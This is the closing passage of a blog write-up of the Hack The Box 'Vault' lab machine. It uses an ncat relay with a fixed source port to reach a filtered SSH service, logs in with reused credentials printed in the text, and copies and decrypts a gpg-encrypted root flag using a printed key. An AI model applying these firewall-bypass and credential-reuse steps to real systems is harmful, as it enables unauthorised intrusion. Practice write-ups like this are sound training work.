<br><img src="/images/hackthebox/vault/40.png" alt="" class="align-center"><br><br>
Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan :
<code class="language-plaintext highlighter-rouge">nmap -Pn 192.168.5.2</code>
<br><img src="/images/hackthebox/vault/41.png" alt="" class="align-center"><br><br>
Port 53 and 4444 , both of them are closed. weird … where is port 987 ?
<br>So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.<br>
To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use <code class="language-plaintext highlighter-rouge">ncat</code> and make it listen on port 2222 , then the service running on that port will be another <code class="language-plaintext highlighter-rouge">ncat</code> connection from port 4444 to port 987 on <code class="language-plaintext highlighter-rouge">192.168.5.2</code> 
<br><code class="language-plaintext highlighter-rouge">ncat -l 2222 --sh-exec "ncat -p 4444 192.168.5.2 987"</code>
<br><img src="/images/hackthebox/vault/42.png" alt="" class="align-center"><br><br>
We will get another ssh connection to <code class="language-plaintext highlighter-rouge">DNS</code> , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately <code class="language-plaintext highlighter-rouge">nmap</code> can’t tell us because our connection is not direct.<br>
<br><img src="/images/hackthebox/vault/43.png" alt="" class="align-center"><br><br>
So I guessed common services and it was <code class="language-plaintext highlighter-rouge">ssh</code> :
<br><img src="/images/hackthebox/vault/44.png" alt="" class="align-center"><br><br>
I tried <code class="language-plaintext highlighter-rouge">dave</code> as the username and <code class="language-plaintext highlighter-rouge">dav3gerous567</code> as the password (same credentials for <code class="language-plaintext highlighter-rouge">DNS</code>) and it worked.<br></p>

<h2 id="decrypting-root-flag">Decrypting root flag</h2>
<p>In the <code class="language-plaintext highlighter-rouge">/home</code> directory of <code class="language-plaintext highlighter-rouge">dave</code> on <code class="language-plaintext highlighter-rouge">vault</code> there’s a file called <code class="language-plaintext highlighter-rouge">root.txt.gpg</code> :
<br><img src="/images/hackthebox/vault/45.png" alt="" class="align-center"><br><br>
Which is the root flag but gpg encrypted :
<br><img src="/images/hackthebox/vault/46.png" alt="" class="align-center"><br><br>
We need a key to decrypt the flag , remember the key we saw earlier on <code class="language-plaintext highlighter-rouge">ubuntu</code> ? We will copy the file to <code class="language-plaintext highlighter-rouge">ubuntu</code> to decrypt it , Easiest way to do it is to <code class="language-plaintext highlighter-rouge">base64</code> encode it then copy the <code class="language-plaintext highlighter-rouge">base64</code> data and decode it on <code class="language-plaintext highlighter-rouge">ubuntu</code>. But <code class="language-plaintext highlighter-rouge">base64</code> was not installed on <code class="language-plaintext highlighter-rouge">vault</code> so I used <code class="language-plaintext highlighter-rouge">base32</code> instead :
<br><img src="/images/hackthebox/vault/47.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/48.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/49.png" alt="" class="align-center"><br><br>
Now let’s decrypt it with the key : <code class="language-plaintext highlighter-rouge">itscominghome</code> :
<br><code class="language-plaintext highlighter-rouge">gpg -d root.txt.gpg</code>
<br><img src="/images/hackthebox/vault/50.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/curling/">Hack The Box - Curling</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/redcross/">Hack The Box - RedCross</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-04-06T07:00:00+02:00">April 6, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/wizard-labs/devlife/" class="pagination--pager" title="Wizard Labs - Devlife
">Previous</a>
    
    
      <a href="/hack-the-box/redcross/" class="pagination--pager" title="Hack The Box - RedCross
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
